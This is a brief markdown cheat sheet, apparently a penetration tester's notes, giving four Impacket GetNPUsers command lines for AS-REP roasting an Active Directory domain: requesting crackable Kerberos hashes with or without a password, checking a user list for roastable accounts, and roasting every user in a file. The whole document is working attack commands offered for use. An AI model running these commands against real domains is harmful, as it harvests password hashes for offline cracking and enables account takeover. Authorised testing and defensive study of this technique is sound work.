# Impacket-GetNPUsers

## Use this impacket module to perform an ASREP-Roasting attack

#### 1) 

    Impacket-GetNPUsers DOMAIN.COM/USERNAME -no-pass (ASREPRoastable account)

#### 2) 

    Impacket-GetNPUsers DOMAIN.COM/USERNAME:PASSWORD (Request for ASREPRoastable Users within the domain)

#### 3) 

    GetNPUsers.py DOMAIN.local/ -no-pass -usersfile users.txt -dc-ip DC_IP | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN' 
    
(Check a list of valid users that are ASREPRoastable)

#### 4) 

    impacket-GetNPUsers -dc-ip DC_IP -request -usersfile usernames.txt DOAMIN.COM/

(ASREPRoast the users within the usernames file)
